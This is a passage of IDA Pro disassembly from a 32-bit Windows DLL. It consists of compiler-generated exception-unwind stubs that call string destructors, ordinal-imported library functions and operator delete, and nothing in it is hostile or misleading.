		jmp	sub_6AF3789B
sub_6AF52E4F	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_27. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF52E64	proc near		; DATA XREF: .rdata:stru_6AF62108o
		mov	ecx, [ebp-10h]
		add	ecx, 4
		jmp	sub_6AF3789B
sub_6AF52E64	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_28. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF52E79	proc near		; DATA XREF: .rdata:stru_6AF6212Co
		lea	ecx, [ebp-28h]
		jmp	ds:??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string<char,std::char_traits<char>,std::allocator<char>>(void)
sub_6AF52E79	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_29. PRESS	KEYPAD "+" TO EXPAND]
; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_30. PRESS	KEYPAD "+" TO EXPAND]
; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_31. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF52EA0	proc near		; DATA XREF: .rdata:6AF6225Co
		lea	ecx, [ebp-48h]
		jmp	Ordinal752
sub_6AF52EA0	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF52EA8	proc near		; DATA XREF: .rdata:6AF6226Co
		lea	ecx, [ebp-98h]
		jmp	Ordinal246
sub_6AF52EA8	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_32. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF52EBD	proc near		; DATA XREF: .rdata:stru_6AF622C8o
		lea	ecx, [ebp+0Ch]
		jmp	Ordinal246
sub_6AF52EBD	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_33. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF52ECF	proc near		; DATA XREF: .rdata:6AF622F0o
		lea	ecx, [ebp-48h]
		jmp	Ordinal752
sub_6AF52ECF	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_34. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF52EE1	proc near		; DATA XREF: .rdata:6AF62358o
		lea	ecx, [ebp-70h]
		jmp	Ordinal1230
sub_6AF52EE1	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF52EE9	proc near		; DATA XREF: .rdata:6AF62360o
		lea	ecx, [ebp-28h]
		jmp	sub_6AF37896
sub_6AF52EE9	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF52EF1	proc near		; DATA XREF: .rdata:6AF62368o
		lea	ecx, [ebp-5Ch]
		jmp	Ordinal752
sub_6AF52EF1	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_35. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF52F03	proc near		; DATA XREF: .rdata:6AF623D0o
		lea	ecx, [ebp-5Ch]
		jmp	Ordinal752
sub_6AF52F03	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_36. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF52F15	proc near		; DATA XREF: .rdata:6AF62438o
		lea	ecx, [ebp-5Ch]
		jmp	Ordinal1230
sub_6AF52F15	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF52F1D	proc near		; DATA XREF: .rdata:6AF62440o
		lea	ecx, [ebp-48h]
		jmp	Ordinal752
sub_6AF52F1D	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_37. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF52F2F	proc near		; DATA XREF: .rdata:6AF624A8o
		lea	ecx, [ebp-5Ch]
		jmp	Ordinal1230
sub_6AF52F2F	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF52F37	proc near		; DATA XREF: .rdata:6AF624B0o
		lea	ecx, [ebp-48h]
		jmp	Ordinal752
sub_6AF52F37	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_38. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF52F49	proc near		; DATA XREF: .rdata:stru_6AF62514o
		lea	ecx, [ebp+0Ch]
		jmp	sub_6AF3789B
sub_6AF52F49	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_39. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF52F5B	proc near		; DATA XREF: .rdata:stru_6AF62538o
		lea	ecx, [ebp-28h]
		jmp	ds:??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string<char,std::char_traits<char>,std::allocator<char>>(void)
sub_6AF52F5B	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_40. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF52F6E	proc near		; DATA XREF: .rdata:stru_6AF6255Co
		lea	ecx, [ebp-2Ch]
		jmp	ds:??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string<char,std::char_traits<char>,std::allocator<char>>(void)
sub_6AF52F6E	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_41. PRESS	KEYPAD "+" TO EXPAND]
; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_42. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF52F8B	proc near		; DATA XREF: .rdata:stru_6AF625D0o
		lea	ecx, [ebp-54h]
		jmp	Ordinal246
sub_6AF52F8B	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF52F93	proc near		; DATA XREF: .rdata:stru_6AF625D0o
		lea	ecx, [ebp-0A4h]
		jmp	loc_6AF3595A
sub_6AF52F93	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_43. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF52FA8	proc near		; DATA XREF: .rdata:6AF62600o
		lea	ecx, [ebp-48h]
		jmp	Ordinal752
sub_6AF52FA8	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_44. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF52FBA	proc near		; DATA XREF: .rdata:6AF62668o
		lea	ecx, [ebp-48h]
		jmp	Ordinal752
sub_6AF52FBA	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_45. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF52FCC	proc near		; DATA XREF: .rdata:6AF626D0o
		lea	ecx, [ebp-4Ch]
		jmp	Ordinal752
sub_6AF52FCC	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_46. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF52FDE	proc near		; DATA XREF: .rdata:6AF62738o
		lea	ecx, [ebp-54h]
		jmp	Ordinal752
sub_6AF52FDE	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_47. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF52FF0	proc near		; DATA XREF: .rdata:6AF627A0o
		lea	ecx, [ebp-48h]
		jmp	Ordinal752
sub_6AF52FF0	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_48. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF53002	proc near		; DATA XREF: .rdata:6AF62808o
		lea	ecx, [ebp-5Ch]
		jmp	Ordinal1230
sub_6AF53002	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF5300A	proc near		; DATA XREF: .rdata:6AF62810o
		lea	ecx, [ebp-48h]
		jmp	Ordinal752
sub_6AF5300A	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_49. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF5301C	proc near		; DATA XREF: .rdata:6AF62878o
		lea	ecx, [ebp-5Ch]
		jmp	Ordinal1230
sub_6AF5301C	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF53024	proc near		; DATA XREF: .rdata:6AF62880o
		lea	ecx, [ebp-48h]
		jmp	Ordinal752
sub_6AF53024	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_50. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF53036	proc near		; DATA XREF: .rdata:6AF6291Co
		lea	ecx, [ebp-4Ch]
		jmp	Ordinal752
sub_6AF53036	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_51. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF53048	proc near		; DATA XREF: .rdata:6AF62984o
		lea	ecx, [ebp-4Ch]
		jmp	Ordinal752
sub_6AF53048	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_52. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF5305A	proc near		; DATA XREF: .rdata:6AF629ECo
		lea	ecx, [ebp-60h]
		jmp	Ordinal752
sub_6AF5305A	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF53062	proc near		; DATA XREF: .rdata:6AF629FCo
		lea	ecx, [ebp-28h]
		jmp	sub_6AF3789B
sub_6AF53062	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF5306A	proc near		; DATA XREF: .rdata:6AF62A04o
		lea	ecx, [ebp-2Ch]
		jmp	sub_6AF3789B
sub_6AF5306A	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF53072	proc near		; DATA XREF: .rdata:6AF62A0Co
		lea	ecx, [ebp-30h]
		jmp	sub_6AF3789B
sub_6AF53072	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_53. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF53084	proc near		; DATA XREF: .rdata:6AF62A6Co
		lea	ecx, [ebp-5Ch]
		jmp	Ordinal1230
sub_6AF53084	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF5308C	proc near		; DATA XREF: .rdata:6AF62A74o
		lea	ecx, [ebp-48h]
		jmp	Ordinal752
sub_6AF5308C	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_54. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF5309E	proc near		; DATA XREF: .rdata:6AF62ADCo
		lea	ecx, [ebp-28h]
		jmp	sub_6AF3789B
sub_6AF5309E	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF530A6	proc near		; DATA XREF: .rdata:6AF62AE4o
		lea	ecx, [ebp-4Ch]
		jmp	Ordinal752
sub_6AF530A6	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_55. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF530B8	proc near		; DATA XREF: .rdata:stru_6AF62B48o
		lea	ecx, [ebp-28h]
		jmp	ds:??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string<char,std::char_traits<char>,std::allocator<char>>(void)
sub_6AF530B8	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_56. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF530CB	proc near		; DATA XREF: .rdata:stru_6AF62B6Co
		mov	ecx, [ebp-10h]
		add	ecx, 8
		jmp	sub_6AF3789B
sub_6AF530CB	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_57. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF530E0	proc near		; DATA XREF: .rdata:stru_6AF62B90o
		push	dword ptr [ebp+8]
		push	dword ptr [ebp-10h]
		call	Ordinal1162
		pop	ecx
		pop	ecx
		retn
sub_6AF530E0	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_58. PRESS	KEYPAD "+" TO EXPAND]
; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_59. PRESS	KEYPAD "+" TO EXPAND]
; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_60. PRESS	KEYPAD "+" TO EXPAND]
; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_61. PRESS	KEYPAD "+" TO EXPAND]
; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_62. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF53120	proc near		; DATA XREF: .rdata:6AF62CF8o
		lea	ecx, [ebp-28h]
		jmp	Ordinal459
sub_6AF53120	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_63. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF53132	proc near		; DATA XREF: .rdata:6AF62D84o
		lea	ecx, [ebp+10h]
		jmp	sub_6AF3789B
sub_6AF53132	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_64. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF53144	proc near		; DATA XREF: .rdata:6AF62E10o
		lea	ecx, [ebp-48h]
		jmp	Ordinal752
sub_6AF53144	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF5314C	proc near		; DATA XREF: .rdata:6AF62E20o
		lea	ecx, [ebp-24h]
		jmp	Ordinal459
sub_6AF5314C	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF53154	proc near		; DATA XREF: .rdata:6AF62E28o
		lea	ecx, [ebp+8]
		jmp	sub_6AF3789B
sub_6AF53154	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_65. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF53166	proc near		; DATA XREF: .rdata:6AF62E88o
		lea	ecx, [ebp-54h]
		jmp	Ordinal752
sub_6AF53166	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF5316E	proc near		; DATA XREF: .rdata:6AF62E98o
		lea	ecx, [ebp-28h]
		jmp	sub_6AF3789B
sub_6AF5316E	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF53176	proc near		; DATA XREF: .rdata:6AF62EA0o
		lea	ecx, [ebp-34h]
		jmp	sub_6AF3789B
sub_6AF53176	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF5317E	proc near		; DATA XREF: .rdata:6AF62EA8o
		lea	ecx, [ebp-30h]
		jmp	sub_6AF3789B
sub_6AF5317E	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_66. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF53190	proc near		; DATA XREF: .rdata:6AF62F08o
		lea	ecx, [ebp-48h]
		jmp	Ordinal752
sub_6AF53190	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF53198	proc near		; DATA XREF: .rdata:6AF62F18o
		lea	ecx, [ebp-24h]
		jmp	sub_6AF3D213
sub_6AF53198	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF531A0	proc near		; DATA XREF: .rdata:6AF62F20o
		lea	ecx, [ebp+0Ch]
		jmp	sub_6AF3789B
sub_6AF531A0	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF531A8	proc near		; DATA XREF: .rdata:6AF62F28o
		lea	ecx, [ebp+8]
		jmp	sub_6AF3789B
sub_6AF531A8	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF531B0	proc near		; DATA XREF: .rdata:6AF62F30o
		lea	ecx, [ebp-28h]
		jmp	sub_6AF3789B
sub_6AF531B0	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_67. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF531C2	proc near		; DATA XREF: .rdata:6AF62F90o
		lea	ecx, [ebp-64h]
		jmp	Ordinal1230
sub_6AF531C2	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF531CA	proc near		; DATA XREF: .rdata:6AF62F98o
		lea	ecx, [ebp-28h]
		jmp	sub_6AF3789B
sub_6AF531CA	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF531D2	proc near		; DATA XREF: .rdata:6AF62FA0o
		lea	ecx, [ebp-50h]
		jmp	Ordinal752
sub_6AF531D2	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_68. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF531E4	proc near		; DATA XREF: .rdata:6AF63008o
		lea	ecx, [ebp-58h]
		jmp	Ordinal1230
sub_6AF531E4	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF531EC	proc near		; DATA XREF: .rdata:6AF63010o
		lea	ecx, [ebp-44h]
		jmp	Ordinal752
sub_6AF531EC	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_69. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF531FE	proc near		; DATA XREF: .rdata:6AF63078o
		lea	ecx, [ebp-5Ch]
		jmp	Ordinal1230
sub_6AF531FE	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF53206	proc near		; DATA XREF: .rdata:6AF63080o
		lea	ecx, [ebp-0A0h]
		jmp	Ordinal1164
sub_6AF53206	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF53211	proc near		; DATA XREF: .rdata:6AF63088o
		lea	ecx, [ebp-48h]
		jmp	Ordinal752
sub_6AF53211	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF53219	proc near		; DATA XREF: .rdata:6AF63098o
		lea	ecx, [ebp-168h]
		jmp	Ordinal1524
sub_6AF53219	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_70. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF5322E	proc near		; DATA XREF: .rdata:6AF630F8o
		lea	ecx, [ebp-60h]
		jmp	Ordinal1230
sub_6AF5322E	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF53236	proc near		; DATA XREF: .rdata:6AF63100o
		lea	ecx, [ebp-28h]
		jmp	sub_6AF3789B
sub_6AF53236	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF5323E	proc near		; DATA XREF: .rdata:6AF63108o
		lea	ecx, [ebp-50h]
		jmp	Ordinal752
sub_6AF5323E	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF53246	proc near		; DATA XREF: .rdata:6AF63118o
		lea	ecx, [ebp-0A8h]
		jmp	Ordinal1164
sub_6AF53246	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_71. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF5325B	proc near		; DATA XREF: .rdata:6AF63178o
		lea	ecx, [ebp-58h]
		jmp	Ordinal1230
sub_6AF5325B	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF53263	proc near		; DATA XREF: .rdata:6AF63180o
		lea	ecx, [ebp-44h]
		jmp	Ordinal752
sub_6AF53263	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_72. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF53275	proc near		; DATA XREF: .rdata:6AF631E8o
		lea	ecx, [ebp+8]
		jmp	sub_6AF3789B
sub_6AF53275	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_73. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF53287	proc near		; DATA XREF: .rdata:6AF63240o
		lea	ecx, [ebp-14h]
		jmp	sub_6AF3789B
sub_6AF53287	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_74. PRESS	KEYPAD "+" TO EXPAND]
; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_75. PRESS	KEYPAD "+" TO EXPAND]
; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_76. PRESS	KEYPAD "+" TO EXPAND]
; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_77. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF532B7	proc near		; DATA XREF: .rdata:6AF63388o
		lea	ecx, [ebp-5Ch]
		jmp	Ordinal1230
sub_6AF532B7	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF532BF	proc near		; DATA XREF: .rdata:6AF63390o
		lea	ecx, [ebp-48h]
		jmp	Ordinal752
sub_6AF532BF	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_78. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF532D1	proc near		; DATA XREF: .rdata:6AF633F8o
		lea	ecx, [ebp-28h]
		jmp	sub_6AF3789B
sub_6AF532D1	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF532D9	proc near		; DATA XREF: .rdata:6AF63400o
		lea	ecx, [ebp-50h]
		jmp	Ordinal752
sub_6AF532D9	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_79. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF532EB	proc near		; DATA XREF: .rdata:6AF63468o
		lea	ecx, [ebp-6Ch]
		jmp	Ordinal1230
sub_6AF532EB	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF532F3	proc near		; DATA XREF: .rdata:6AF63470o
		lea	ecx, [ebp-0B0h]
		jmp	Ordinal1164
sub_6AF532F3	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF532FE	proc near		; DATA XREF: .rdata:6AF63478o
		lea	ecx, [ebp-28h]
		jmp	sub_6AF3789B
sub_6AF532FE	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF53306	proc near		; DATA XREF: .rdata:6AF63480o
		lea	ecx, [ebp-58h]
		jmp	Ordinal752
sub_6AF53306	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_80. PRESS	KEYPAD "+" TO EXPAND]
; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_81. PRESS	KEYPAD "+" TO EXPAND]
; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_82. PRESS	KEYPAD "+" TO EXPAND]
; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_83. PRESS	KEYPAD "+" TO EXPAND]
; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_84. PRESS	KEYPAD "+" TO EXPAND]
; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_85. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF5334A	proc near		; DATA XREF: .rdata:stru_6AF63674o
		lea	ecx, [ebp-28h]
		jmp	ds:??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string<char,std::char_traits<char>,std::allocator<char>>(void)
sub_6AF5334A	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_86. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF5335D	proc near		; DATA XREF: .rdata:6AF6369Co
		lea	ecx, [ebp-44h]
		jmp	Ordinal752
sub_6AF5335D	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_87. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF5336F	proc near		; DATA XREF: .rdata:6AF63704o
		lea	ecx, [ebp-48h]
		jmp	Ordinal752
sub_6AF5336F	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_88. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF53381	proc near		; DATA XREF: .rdata:6AF637A4o
		lea	ecx, [ebp-4Ch]
		jmp	Ordinal752
sub_6AF53381	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_89. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF53393	proc near		; DATA XREF: .rdata:stru_6AF63808o
		lea	ecx, [ebp-2Ch]
		jmp	ds:??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string<char,std::char_traits<char>,std::allocator<char>>(void)
sub_6AF53393	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_90. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF533A6	proc near		; DATA XREF: .rdata:stru_6AF6382Co
		lea	ecx, [ebp-28h]
		jmp	ds:??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string<char,std::char_traits<char>,std::allocator<char>>(void)
sub_6AF533A6	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_91. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF533B9	proc near		; DATA XREF: .rdata:stru_6AF63850o
		lea	ecx, [ebp-1Ch]
		jmp	Ordinal1230
sub_6AF533B9	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_92. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF533CB	proc near		; DATA XREF: .rdata:stru_6AF63874o
		mov	ecx, [ebp-10h]
		jmp	Ordinal478
sub_6AF533CB	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_93. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF533DD	proc near		; DATA XREF: .rdata:6AF6389Co
		lea	ecx, [ebp-58h]
		jmp	Ordinal1230
sub_6AF533DD	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF533E5	proc near		; DATA XREF: .rdata:6AF638A4o
		lea	ecx, [ebp-48h]
		jmp	Ordinal752
sub_6AF533E5	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_94. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF533F7	proc near		; DATA XREF: .rdata:6AF6390Co
		lea	ecx, [ebp-30h]
		jmp	Ordinal752
sub_6AF533F7	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_95. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF53409	proc near		; DATA XREF: .rdata:6AF63964o
		lea	ecx, [ebp-30h]
		jmp	Ordinal752
sub_6AF53409	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_96. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF5341B	proc near		; DATA XREF: .rdata:6AF639BCo
		lea	ecx, [ebp-34h]
		jmp	Ordinal752
sub_6AF5341B	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_97. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF5342D	proc near		; DATA XREF: .rdata:stru_6AF63A10o
		push	dword ptr [ebp-10h] ; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx
		retn
sub_6AF5342D	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_98. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF53441	proc near		; DATA XREF: .rdata:6AF63A38o
		lea	ecx, [ebp-34h]
		jmp	Ordinal752
sub_6AF53441	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_99. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF53453	proc near		; DATA XREF: .rdata:6AF63A90o
		lea	ecx, [ebp-50h]
		jmp	Ordinal752
sub_6AF53453	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_100. PRESS KEYPAD	"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF53465	proc near		; DATA XREF: .rdata:6AF63AF8o
		lea	ecx, [ebp-48h]
		jmp	Ordinal752
sub_6AF53465	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_101. PRESS KEYPAD	"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF53477	proc near		; DATA XREF: .rdata:6AF63B60o
		lea	ecx, [ebp+8]
		jmp	sub_6AF3789B
sub_6AF53477	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF5347F	proc near		; DATA XREF: .rdata:6AF63B68o
		lea	ecx, [ebp-48h]
		jmp	Ordinal752
sub_6AF5347F	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_102. PRESS KEYPAD	"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_6AF53491	proc near		; DATA XREF: .rdata:6AF63BD0o
		lea	ecx, [ebp-20h]
